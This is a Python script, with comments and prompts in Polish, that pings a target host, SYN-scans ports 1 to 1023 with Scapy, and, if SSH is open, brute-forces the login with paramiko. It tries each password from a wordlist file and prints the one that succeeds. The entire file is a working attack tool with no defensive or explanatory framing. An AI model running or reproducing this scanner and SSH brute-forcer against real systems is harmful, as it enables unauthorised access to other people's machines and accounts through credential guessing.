from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP
import paramiko


def scanport(port, target):
    source_port = RandShort()
    SynPck = IP(dst=target) / TCP(sport=source_port, dport=port, flags='S')
    synchronization_packet = sr1(SynPck, timeout=0.5)
    conf.verb = 0
    if synchronization_packet is None:
        print(False)
    else:
        if synchronization_packet.haslayer(TCP):
            if synchronization_packet[TCP].flags == 0x12:
                # Flagi są równe 0x12 (SYN-ACK)
                print(f"Port is open: {port}")
                rst_packet = IP(dst=target) / TCP(sport=source_port, dport=port, flags='R')
                sr(rst_packet, timeout=2)
                print(f"Connection closed: {port}")
                return True
            else:
               print(f"Port is closed or filtered: {port}")
               return False
        else:
            print(False)

def target_avb(target):
    try:
        conf.verb = 0
        ICMP_packet = sr1(IP(dst=target) / ICMP(), timeout=3)
        if ICMP_packet:
            return True  # Host jest dostępny
        else:
            print("Host niedostepny")
            return False  # Host jest niedostępny
    except Exception as e:
        print(e)
        return False

def BruteForce(port,target):

    user = input("podaj login celu")
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Otwieranie pliku "password.txt" w trybie odczytu ("r")
    with open("PasswordList.txt", "r") as file:
        # Odczyt zawartości pliku
        passwords = file.read().splitlines()

    for password in passwords:
        try:
            SSHconn.connect(target, port=int(port), password=password, username=user, timeout=1)
            print(f"Zalogowano się z hasłem: {password}")
            break
        except paramiko.AuthenticationException:
            print(f"Błąd logowania z hasłem: {password}")
            continue

    SSHconn.close()

def main():
    target = input("Podaj adres IP celu")
    open_ports = []

    if target_avb(target):
        for port in range(1, 1024):
            status = scanport(port, target)  # Przypisz wynik do zmiennej status
            if status == True:
                open_ports.append(port)

    if open_ports:
        print(f"Open ports on {target}: {', '.join(map(str, open_ports))}")
    else:
        print(f"No open ports on {target}.")
    print("Scan finished")

    if 22 in open_ports:
        print("Port 22 (SSH) jest dostępny.")
        choice = input("Czy chcesz wykonać BruteForce na porcie 22? (Y/N): ").lower()
        if choice.lower() == "y":
            BruteForce(22, target)
        else:
            print("Nie wykonano BruteForce na porcie 22.")


if __name__ == "__main__":
   main()
